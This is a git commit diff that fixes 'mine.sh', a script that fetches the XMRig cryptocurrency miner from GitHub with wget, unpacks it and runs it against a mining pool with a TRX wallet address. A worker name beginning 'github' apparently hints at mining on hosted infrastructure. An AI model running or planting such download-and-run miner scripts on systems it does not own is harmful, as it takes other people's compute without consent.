771a9ee8c1fab5fc6ce450e920bb77ead128504b
Nayuki Pro <91455547+Nayuki-Pro@users.noreply.github.com>
2022-05-27 09:06:07 +0800

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,5 +1,4 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
-tar -zxvf xmrig-6.17.0-linux-x64
+tar -zxvf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig*
-cd NBMiner_Linux
 ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TBy3L5RcEF12sbdGm3S1YjhAvXsaPhzHEy.github#n598-vp1z -p x pause 
